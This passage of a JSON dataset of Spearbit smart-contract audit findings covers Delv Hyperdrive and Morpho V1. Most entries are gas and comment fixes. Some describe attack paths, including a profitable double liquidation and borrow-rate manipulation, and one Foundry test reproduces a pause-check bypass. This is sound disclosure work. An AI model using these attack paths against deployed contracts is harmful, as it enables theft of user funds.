        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Maturity times are separated into buckets of _checkpointDuration seconds. All bonds purchased at a time that maps to the same checkpoint maturity time are treated equally. This leads to rational traders timing their swaps. For example, long buyers are incentivized to buy at the end of the current bucket (expecting no interest rate movements within the bucket) to reduce the effective time to maturity of the bond.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Dangerous max approvals to underlying protocols",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Within the constructor of various Hyperdrive instances, an approval with type(uin256).max is used on the baseToken to the underlying protocol. The design decision was probably made so that an approval call to not be performed at every deposit, e.g. ERC4626Hyperdrive.sol#L51: _config.baseToken.approve(address(pool), type(uint256).max); This introduces a risk in case the underlying protocol contains a bug that lets consume any approval, an exploiter can use it to drain the pools under that protocol.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fees are not capped in factories but checked upon deployment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The HyperdriveFactory.updateFees function does not restrict the fee values. However, the Hy- perdriveStorage.constructor restricts the fee values. Setting wrong fees will only be caught with failing deploy- ments.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Specific Hyperdrive factories should ensure that local storage vars used match the ones of the deployer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Some storage variables like pool are duplicated in the yield-source specific factories (like ERC4626HyperdriveFactory) and their deployer contracts (like ERC4626HyperdriveDeployer). There is no check that these variables match. If they mismatch, the data provider that is deployed by the factory will use a different pool than the Hyperdrive contract that is deployed by the deployer.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Multitokens lack of sanity zero-address check at transferFrom can lead to lock of funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "External transferFrom or the internal _transferFrom should include checks to enforce the to ad- dress not to be 0 as assets can get lost in error prone scenarios such as default values. Notice that this is already done in the batch version, however, in the external transferFrom path, this is not enforced. As this is not technically ERC1155, it is not enforced that the code must have this check, still good to prevent some edge scenarios where assets are lost.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ether can get locked when calling deployAndInitialize",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "deployAndInitialize it's a public payable function used to deploy copies of hyperdrive with differ- ent config parameters. There are 2 main paths on the code, deploying with ERC20 or deploying with ether as a contribution: 37 // We only do ERC20 transfers when we deploy an ERC20 pool if (address(_config.baseToken) != ETH) { //@audit erc20 path that don  t use ether // Initialize the Hyperdrive instance. _config.baseToken.transferFrom( msg.sender, address(this), _contribution ); _config.baseToken.approve(address(hyperdrive), type(uint256).max); hyperdrive.initialize(_contribution, _apr, msg.sender, true); } else { //@audit eth path // Require the caller sent value if (msg.value != _contribution) { revert Errors.TransferFailed(); } hyperdrive.initialize{ value: _contribution }( _contribution, _apr, msg.sender, true ); } Later, some variable setters are called like who is the pauser, governance, etc. However, if choosen ERC20 path, with additional ether, this ether would get locked as HyperdriveFactory doesn't have mechanisms to deal with it. A reasonable way that could lead to this scenario would be because the same function is called for both deployment types, therefore, one user can first set everything for the ether scenario, later change his mind and clean everything but ether.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step governance change introduces risks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Single-step governance role transfers add the risk of setting an unwanted governance address by accident (this includes address(0) as checks are not performed) if the governance transfer is not done with excessive care.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "governanceCurveFee can avoid one multiplication and division",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "governanceCurveFee has a _sharePrice in its calculation which can be avoided, resulting in one less multiplication and division here. To do so, we would need to only apply the multiplication for calculating bondReservesDelta.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Calculation of currentValue can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "currentValue calculated as: uint256 currentValue = lpShares.mulDivDown( endingPresentValue, lpTotalSupply + lpShares ); where lpShares is: lpShares = (endingPresentValue - startingPresentValue).mulDivDown( lpTotalSupply, startingPresentValue );",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_applyCheckpoint(...)'s return statement can be optimised",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "_applyCheckpoint(...)'s return statement can be optimized to avoid reading from the storage.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Squaring overflow check in _rpow can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "In the implementation of _rpow there is a check to make sure when squaring a number it would not overflow: let xx := mul(x, x) if iszero(eq(div(xx, x), x)) { revert(0, 0) }",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "StethHyperdrive...'s _pricePerShare() can be optimised",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "_pricePerShare() calls _lido twice: function _pricePerShare() internal view override returns (uint256 price) { return _lido.getTotalPooledEther().divDown(_lido.getTotalShares()); } Note using divDown since both the numerator and the denominator should have the same fixed precision the result would be in the 18 decimal fixed format.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Several math computations can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "There are several computations in the contract where the FixedMath library is used to first multiply by 1e18 and then divide by 1e18 again. One can either use the standard division operator or the 2-argument version of mulDivDown.  HyperdriveDataProvider.sol#L162: The deltaSum.divDown(deltaTime * 1e18) = deltaSum * 1e18 / (deltaTime * 1e18) computation is the same as deltaSum / deltaTime.  AaveHyperdrive.sol#L112: shares.mulDown(assets.divDown(totalShares_)) = shares * (assets * 1e18 / totalShares_) / 1e18 could be shares.mulDivDown(assets, totalShares_).  HyperdriveMath.sol#L70: To scale to one year, consider doing mulDivDown(365 days, _positionDura- tion). Currently, annualizedTime is first computed as an 1e18-based percentage value.  HyperdriveMath.sol#L97: FixedPointMath.ONE_18.mulDown(_timeStretch) is just _timeStretch.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Hardcoded default values can be set in declaration of state variables for tiny gas opts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Hardcoded default values are not needed to be set in the constructor and therefore provide a tiny gas optimization (3) as an assignment is avoided: - uint256 public versionCounter; + uint256 public versionCounter = 1; // ... constructor( address _governance, IHyperdriveDeployer _deployer, address _hyperdriveGovernance, address _feeCollector, IHyperdrive.Fees memory _fees, address[] memory _defaultPausers, address _linkerFactory, bytes32 _linkerCodeHash ) { - governance = _governance; hyperdriveDeployer = _deployer; versionCounter = 1; Total in tests: Overall gas change: -18 (-0.000%)",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "unchecked blocks are more gas efficient where it can't overflow / underflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "unchecked blocks are more gas efficient as they don't include checks included since pragma version 0.8, therefore in calculations where overflow is not possible, unchecked blocks can be used to have better gas performance.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Prefix operator costs less gas than Postfix operator, especially when it's used in for-loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Prefix operator costs less than postfix operator as it avoids an extra read, when used in for loops, this is even more noticed. After applying changes, general overall change on the tests it's notable. Overall gas change: -13252506 (-0.028%)",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Not caching variables affects gas usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Reading multiple times a storage variable is less gas efficient than caching the value in a local variable to avoid the extra gas usage on the SLOAD operations. Overall gas change: -16074 (-0.000%) Also some calculations can be cached:  HyperdriveLong.sol#L412: governanceCurveFee.divDown(_sharePrice) can be cached.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Last value can be considered rather than recording overflowed values at recordPrice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The last value can be compared to check if there has been an overflow after the calculation. If so, it can be chosen what to do regarding this case. The reverting option is not considered as said by the comment, however, other options such as recording the last calculated value can be chosen or even not recording a value altogether. // Calculate sum uint256 delta = block.timestamp - previousTime; // NOTE - We do not expect this should ever overflow under normal conditions // uint256 sum; unchecked { but if it would we would prefer that the oracle does not lock trade closes sum = price * delta + previousSum; }",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "longOpenSharePrice is not publicly exposed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The longOpenSharePrice variable of the MarketState struct is not exposed to be publicly called via getPoolInfo function within HyperdriveDataProvider. This variable is used within _applyRemoveLiquidity to calculate the shareProceeds (proceeds released immediately when an LP removes liquidity). Exposing this variable will ease the interaction with the Hyperdriver by third parties or off-chain infrastructure that can be built around the Hyperdriver.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "FixedPointMath's exp and _ln implementations needs to be verified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Checking the correctness of exp and _ln could not fit into the timeline of this audit. Especially the parts that include approximating certain functions by rational functions and their coefficient derivations and the final scaling values need to be verified.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Due to division errors we might enter into the negative interest region when closing a short position",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "In this context when we apply the flat part of the close short trade we need to consider the case that due to division errors we might enter into the negative interest region here. Note that the error introduced is at most 1 (1 wei). The check for entering into the negative interest region only considers the curve part of the trade which happens before the adjustedShareReserves >= bondReserves line",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "0-interest is not allowed when opening a long or closing a short",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "In the above context when opening a long or closing a short we check that the updated ration y (cid:22)z > 1 which means that we are in the positive interest zone. Ending up on the 0 interest line is not allowed. Although the comment and the custom error name indicate that only negative interest points should be reverted. Also the check in _calculateOpenShort(...) only reverts if we are strictly in the negative interest zone and would allow the point to be on the 0-interest line.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Natspec and comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Comments are key to understanding the codebase. In particular, Natspec comments provide rich documentation for functions, return variables and more. This documentation aids users, developers and auditors in understanding what the functions within the contract are meant to do. Some functions within the codebase have no Natspec (which in the case of interfaces can be later inherited using @inheritdoc).  Missing clarification comments:  FixedPointMath.sol#L182-L184:  Missing natspec: 54916777467707473351141471128 = b296 ln 2c  IERC20Mint.sol#L1-L10  IERC20Permit.sol#L38-L55  IERC4626.sol#L1-L152  IForwarderFactory.sol#L1-L8  IHyperdriveDeployer.sol#L1-L15  IHyperdriveRead.sol#L1-L29  IHyperdriveWrite.sol#L1-L73  ILido.sol#L1-L21  IMaker.sol#L1-L26  IMultiTokenMetadata.sol#L1-L7  IMultiTokenRead.sol#L1-L32  IMultiTokenWrite.sol#L1-L71  IWETH.sol#L1-L10  SafeCast.sol#L8-L12",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Custom errors can be used for consistency, gas optimization and better debugging",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "In most parts of the code, there is heavy usage of custom errors when it comes to checks (i.e. AssetId.sol), while in SafeCast.sol, a require statement is used without an error message, an error message that would help at debugging. Instead of adding and using error strings (which are better for debugging and monitoring), custom errors could be used, which would reduce deployment and runtime costs and also add consistency. Additionally, ForwarderFactory.sol#L49 uses assert. Although it would revert as the other methods, it's generally used more in testing tools like Echidna and it will consume all gas rather than returning the remaining gas to the user.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused code should be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The following imports are unused in:  HyperdriveTwap.sol import { Errors } from \"./libraries/Errors.sol\";  AssetId.sol import { FixedPointMath } from \"./FixedPointMath.sol\";  HyperdriveShort.sol import { YieldSpaceMath } from \"./libraries/YieldSpaceMath.sol\";  AaveHyperdriveDeployer.sol import { Errors } from \"../libraries/Errors.sol\";  YieldSpaceMath.sol have code that is not used within the base code: function calculateBondsInGivenSharesOut( uint256 z, uint256 y, uint256 dz, uint256 t, uint256 c, uint256 mu ) internal pure returns (uint256) {",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "FixedPointMath._ln(0) should revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The FixedPointMath._ln function has this comment: // Intentionally allowing ln(0) to pass bc the function will return 0 // to pow() so that pow(0,1)=0 without a branch if (x < 0) revert Errors.FixedPointMath_NegativeInput(); However, this function does not return 0, _ln(0) = -46298671574056668922.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "MultiToken transfer check inconsistencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The MultiToken.batchTransferFrom function checks that the from and to parameters are non- zero. The transferFrom function does not perform these checks.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "totalBase computation inconsistency for DsrHyperdrive.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The DsrHyperdrive contract computes the totalBase in two different ways:  _deposit: uint256 totalBase = dsrManager.daiBalance(address(this));.  _pricePerShare: uint256 pie = dsrManager.pieOf(address(this)); and uint256 totalBase = pie.mulDivDown(chi(), RAY);.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "_pricePerShare default value is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The default value of _pricePerShare() for a non-existent totalSupply is 0 for AaveHyperdrive and DsrHyperdrive.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing aToken and baseToken compatability check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When deploying an Aave Hyperdrive instance it is not checked if the provided aToken and the config's baseToken are compatible.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "calculateBaseVolume can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When opening shorts, the base volume is computed as HyperdriveMath.calculateBaseVolume(_- shareReservesDelta.mulDown(_openSharePrice), _bondAmount, _timeRemaining). However, the _timeRe- maining parameter will always be 1e18 as shorts are always opened at max maturity time. Furthermore, on openShort HyperdriveShort.sol#L61 the timeRemaining will always be the maturityTime so the _calculateTimeRemaining can be skipped and timeRemaining replaced with 1e18.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Factory sets unnecessary max approvals to Hyperdrive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The HyperdriveFactory sets an infinite approval to the Hyperdrive deployment for the initial contribu- tion.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos and errors in comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "There are typos and logical errors or ambiguity in the comments: fixed context recommendation fix PR/commit DsrHyperdriveFactory.sol#L30 manger ! manager ERC4626HyperdriveFactory.sol#L30 The Maker ERC4626 manger con- tract address. This looks like a copy and paste error, it's unclear how Maker is involved here, it should work with any ERC4626 vault. HASH HASH HyperdriveStorage.sol#L79 sun ! sum HASH 48 fixed context recommendation fix PR/commit HyperdriveShort.sol#L256 // Update the average maturity HASH HyperdriveBase.sol#L255 HyperdriveBase.sol#L287 HyperdriveLP.sol#L381 HyperdriveDataProvider.sol#L139- L145 IHyperdrive.sol#L23 MultiToken.sol#L20 HyperdriveMath.sol#L237 time of long positions. ! // Update the average maturity time of short positions. /// @param _amountIn The given amount in, either in terms of shares or bonds. ! /// @param _amountIn The given amount in, in terms of shares. /// @param _amountIn The given amount in, either in terms of shares or bonds. ! /// @param _amountIn /// @param _amountIn The given amount in, in terms of bonds. Consider naming the return parameter for the withdrawal shares for consis- tency. before the last ! before or at the targetTime. If the timestamp of the current index has older data than the target ! older or equal data The average maturity time of outstanding positions. This com- ment is ambiguous because it is the average maturity time multiplied by 1e18. renaming Consider PERMIT_TYPE- HASH to PERMIT_FOR_ALL_TYPEHASH as there's another prominent Per- mit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline) function used in other protocols but PERMIT_TYPEHASH refers to the PermitForAll function that the MultiToken supports. Furthermore, _- approved is written with an underscore in the typehash which doesn't lead to issues but is rather unconventional. In calculateCloseShort, _amountOut is described as The amount of the asset that is received.. It's un- clear what is meant by this, it should be the bond amount that is being closed. HASH HASH HASH HASH HASH HASH HASH HyperdriveMath.sol#L349 and Hyper- driveMath.sol#L380 It should be 1 - p instead of p - 1. HASH 49 fixed context recommendation fix PR/commit HyperdriveMath.sol#L595 YieldSpaceMath.sol#L202-L205 YieldSpaceMath.sol#L264 ERC4626DataProvider.sol#L52 DsrHyperdriveDataProvider.sol#L85 StethHyperdrive.sol#L84 ERC4626DataProvider HyperdriveLP.sol#L273-L276 ERC20Forwarder.sol#L133 // proceeds = (c1 / c0 * c) * dy - dz ! // proceeds = (c1 / (c0 * c)) * dy - dz is desired. The phrasing of \"invariant must de- rive the same bond/base relation- ship through the redemption value (c)\" is confusing and is the op- We posite of what don't want an invariant such that for the interest rate stays constant bond/baseConvertedFromShares. (1 + r = y / (c*z) = y / x) We want the invariant to keep the bond/shares relationship the same, so the shares growing in value does not change the interest rate of the pool when no trades happen. (1 + r = y / ((cid:181) * z)). The link does not lead to a working ex- ample. The return (sharePrice); is obso- lete as sharePrice is already a named return parameter. The return (totalBase.divDown(_- should totalShares)); be (total- Base.divDown(_totalShares)); to keep a consistency of parameters usage. sharePrice = return // stETH instead of WETH. ! // stETH instead of ETH. should ERC4626HyperdriveDataProvider for consistency. be called uint256(withdrawalShares) on event emitting and return instruction are ob- solete as withdrawalShares is already uint256. @return True if transfer suc- cessful, false if not. The con- tract also reverts ! @return True if transfer successful. The contract reverts HASH HASH HASH HASH HASH HASH HASH HASH HASH HyperdriveFactory.sol#L138-L139 The new governor address ! The new fee collector address HASH 50 fixed context recommendation fix PR/commit HyperdriveFactory.sol#L156-L157 @notice Allows governance to change the fee collector address @notice Allows governance ! to change the default pausers and @param newDefaults The new governor address ! @param newDe- faults The new pausers FixedPointMath.sol#L183-L185 HyperdriveDataProvider.sol#L130 HyperdriveTWAP.sol#L21 and Hyper- driveDataProvider.sol#L130 HyperdriveBase.sol#L216 a that add 54916777467707473351141471128 = b296 ln 2c comment The average price in the smallest gap in the recorded sampled data which is bigger or equal to the provided period. The NatSpec comments need to be the price and more specific about mention that this is the spot price of bonds in terms of base. The endpoint of the range in this Nat- Spec comment needs to be updated to 1e18 or to make sure that it is conveyed that the 1 comes with 18 decimal fixed precision. latestCheckpoint, _matu- rityTime, _positionDuration are not in 1e18 format and thus the result will be due to using divDown. HASH HASH HASH HASH HASH",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Constant ONE_18 should be used instead of 1e18",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "In the code, constant ONE_18 is declared for 1e18. However it is unused sometimes. Declaring a constant is a good practice to avoid using hardcoded numbers. These numbers typically are saved in a variable, so it's easier to read an update them if needed. Additionally, in these files FixedPointMath library can be imported, so these 3 can also be substituted by the constant variable:  HyperdriveStorage.sol#L114  HyperdriveStorage.sol#L115  HyperdriveStorage.sol#L116",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational FixedPointMath.sol#L71, FixedPoint- FixedPointMath.sol#L79,"
        ]
    },
    {
        "title": "type(uint256).max can be used to keep consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Consistency helps both readability and maintainability. type(uint256).max is used within the code multiple times, however, for getting the same value is also used 2 ** 256 - 1;",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lack of events affects transparency and monitoring.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The absence of events in crucial functions, particularly those with privileged access, hinders trans- parency and makes monitoring more difficult. Users and the protocol team itself may encounter unexpected changes resulting from these functions, without the ability to observe the corresponding events.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Liquidating Morpho's Aave position leads to state desync",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Morpho has a single position on Aave that encompasses all of Morpho's individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desyncs from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. It's also possible to double-liquidate for a profit. Example: There's a single borrower B1 on Morpho who is connected to the Aave pool. B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho The ETH price crashes and the position becomes liquidatable. A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit. This repaid debt / removed collateral is not synced with Morpho. The user's supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave. The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus. The state remains desynced.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "A market could be deprecated but still prevent liquidators to liquidate borrowers if isLiquidateBor- rowPaused is true",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Currently, when a market must be deprecated, Morpho checks that borrowing has been paused before applying the new value for the flag. function setIsDeprecated(address _poolToken, bool _isDeprecated) external onlyOwner isMarketCreated(_poolToken) { } if (!marketPauseStatus[_poolToken].isBorrowPaused) revert BorrowNotPaused(); marketPauseStatus[_poolToken].isDeprecated = _isDeprecated; emit IsDeprecatedSet(_poolToken, _isDeprecated); The same check should be done in isLiquidateBorrowPaused, allowing the deprecation of a market only if isLiq- uidateBorrowPaused == false otherwise liquidators would not be able to liquidate borrowers on a deprecated market.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "setIsPausedForAllMarkets bypass the check done in setIsBorrowPaused and allow resuming borrow on a deprecated market",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The MorphoGovernance contract allow Morpho to set the isBorrowPaused to false only if the market is not deprecated. function setIsBorrowPaused(address _poolToken, bool _isPaused) external onlyOwner isMarketCreated(_poolToken) { } if (!_isPaused && marketPauseStatus[_poolToken].isDeprecated) revert MarketIsDeprecated(); marketPauseStatus[_poolToken].isBorrowPaused = _isPaused; emit IsBorrowPausedSet(_poolToken, _isPaused); This check is not enforced by the _setPauseStatus function, called by setIsPausedForAllMarkets allowing Mor- pho to resume borrowing for deprecated market. Test to reproduce the issue // SPDX-License-Identifier: AGPL-3.0-only pragma solidity ^0.8.0; import \"./setup/TestSetup.sol\"; contract TestSpearbit is TestSetup { using WadRayMath for uint256; function testBorrowPauseCheckSkipped() public { // Deprecate a market morpho.setIsBorrowPaused(aDai, true); morpho.setIsDeprecated(aDai, true); checkPauseEquality(aDai, true, true); // you cannot resume the borrowing if the market is deprecated hevm.expectRevert(abi.encodeWithSignature(\"MarketIsDeprecated()\")); morpho.setIsBorrowPaused(aDai, false); checkPauseEquality(aDai, true, true); // but this check is skipped if I call directly `setIsPausedForAllMarkets` morpho.setIsPausedForAllMarkets(false); // this should revert because // you cannot resume borrowing for a deprecated market checkPauseEquality(aDai, false, true); } function checkPauseEquality( address aToken, bool shouldBePaused, 6 bool shouldBeDeprecated ) public { ( bool isSupplyPaused, bool isBorrowPaused, bool isWithdrawPaused, bool isRepayPaused, bool isLiquidateCollateralPaused, bool isLiquidateBorrowPaused, bool isDeprecated ) = morpho.marketPauseStatus(aToken); assertEq(isBorrowPaused, shouldBePaused); assertEq(isDeprecated, shouldBeDeprecated); } }",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User withdrawals can fail if Morpho position is close to liquidation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If the Morpho position on Aave's debt / collateral value is higher than the market's max LTV ratio but lower than the market's liquidation threshold, the borrow will fail and the position can also not be liquidated. The withdrawals could fail.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "P2P borrowers' rate can be reduced",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Users on the pool currently earn a much worse rate than users with P2P credit lines. There's a queue for being connected P2P. As this queue could not be fully processed in a single transaction the protocol introduces the concept of a max iteration count and a borrower/supplier \"delta\" (c.f. yellow paper). This delta leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced, leading to worse rates than before. Example: Imagine some borrowers are matched P2P (earning a low borrow rate), and many are still on the pool and therefore in the pool queue (earning a worse borrow rate from Aave).  An attacker supplies a huge amount, creating a P2P credit line for every borrower. (They can repeat this step several times if the max iterations limit is reached.) 7  The attacker immediately withdraws the supplied amount again. The protocol now attempts to demote the borrowers and reconnect them to the pool. But the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. These are funds borrowed from the pool (at a higher borrowing rate) that are still wrongly recorded to be in a P2P position for some borrowers. This increase in borrowing rate is socialized equally among all P2P borrowers. (reflected in an updated p2pBorrowRate as the shareOfDelta increased.)  The initial P2P borrowers earn a worse rate than before. If the borrower delta is large, it's close to the on-pool rate.  If an attacker-controlled borrower account was newly matched P2P and not properly reconnected to the pool (in the \"demote borrowers\" step of the algorithm), they will earn a better P2P rate than the on-pool rate they earned before.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk Original"
        ]
    },
    {
        "title": "Frontrunners can exploit system by not allowing head of DLL to match in P2P",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
